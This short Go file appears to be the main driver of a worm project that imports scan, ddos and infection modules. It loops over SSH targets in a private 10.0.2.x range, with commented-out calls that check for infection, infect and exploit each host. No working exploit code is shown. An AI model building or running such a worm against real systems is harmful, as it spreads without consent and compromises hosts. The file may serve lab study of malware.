package main

import (
	"fmt"
  	"strconv"
	//"github.com/99graciamanel/mlw/worm/infection"
	"github.com/99graciamanel/mlw/worm/scan"
	"github.com/99graciamanel/mlw/worm/ddos"
)

func main() {
	fmt.Println(scan.Hello("test"))
	fmt.Println(ddos.Hello("test"))
	nAttackers := 5
	for i := 11; i < nAttackers + 11; i++ {
		ip_port := "10.0.2." +  strconv.Itoa(i) + ":22"
		fmt.Println(ip_port)
		/*is_infected := infection.SshCheckInfection(ip_port)
		fmt.Println(is_infected)
		if is_infected {
			return
		}
		message := infection.SshInfect(ip_port)
		fmt.Println(message)
		message = infection.SshExploit(ip_port)
		fmt.Println(message)*/
	}
}
